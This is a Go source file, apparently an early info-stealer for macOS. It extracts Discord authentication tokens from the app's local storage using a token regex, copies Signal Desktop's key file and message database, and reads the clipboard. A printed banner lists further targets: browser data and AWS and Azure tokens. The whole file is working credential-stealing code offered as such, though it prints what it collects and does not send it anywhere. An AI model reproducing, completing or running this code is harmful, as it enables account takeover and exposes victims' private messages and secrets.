package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"runtime"
	"path/filepath"
	"regexp"
	"github.com/f1bonacc1/glippy"
)

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func readFile(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	
	if err != nil {
		return nil, err
	}
	defer file.Close()
	
	stats, statsErr := file.Stat()
	if statsErr != nil {
		return nil, statsErr
	}
	
	var size int64 = stats.Size()
	bytes := make([]byte, size)
	
	bufr := bufio.NewReader(file)
	_,err = bufr.Read(bytes)
	
	return bytes, err
}

func GetDiscordTokensWorker(pattern string) ([]string, error) {
	res := make([]string,10)
	r, _ := regexp.Compile("[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}")
	files, err := filepath.Glob(os.Getenv("HOME")+"/Library/Application Support/Discord/Local Storage/leveldb/"+pattern)
	if err != nil {
		return nil, err
	} else {
		for _,filename := range files {
			b, err := os.ReadFile(filename)
			if err != nil {
				return nil, err
			}
			str := string(b)
			matches := r.FindAllString(str, -1)
			if len(matches) > 0 {
				res = append(res, matches...)
			}
		}
	}
	return res, nil
}

func GetDiscordTokens() ([]string, error) {
	tokens := make([]string, 10)
	part1, err := GetDiscordTokensWorker("*.log")
	if err != nil {
		return nil, err
	}
	tokens = append(tokens, part1...)
	part2, err := GetDiscordTokensWorker("*.ldb")
	if err != nil {
		return nil, err
	}
	tokens = append(tokens, part2...)
	return tokens, nil
}

//How to decode:
//https://danielbeadle.net/post/2020-05-19-signal-desktop-database/
func GetSignalData() ([]byte, []byte, error) {
	keyFile := ""
	database := ""
	var keyFileData []byte
	var databaseData []byte
	var err error
	if runtime.GOOS == "darwin" {
		keyFile = os.Getenv("HOME")+"/Library/Application Support/Signal/config.json"
		database = os.Getenv("HOME")+"/Library/Application Support/Signal/sql/db.sqlite"
	}
	if _, err := os.Stat(keyFile); err == nil {
		fmt.Println("[+] Signal found... getting the data")
		keyFileData, err = readFile(keyFile)
		databaseData, err = readFile(database)
	}
	return keyFileData, databaseData, err
}

func main () {
	fmt.Println("On windows steal: browser code, look for azure and aws tokens in $HOME, Discord, Signal!")
	fmt.Println("")
	keyData, data, err := GetSignalData()
	CheckError(err)
	fmt.Println(len(keyData), len(data))
	tokens, err := GetDiscordTokens()
	CheckError(err)
	fmt.Println(tokens)
	text, err := glippy.Get()
	CheckError(err)
	fmt.Println("Clipboard :"+text)
}
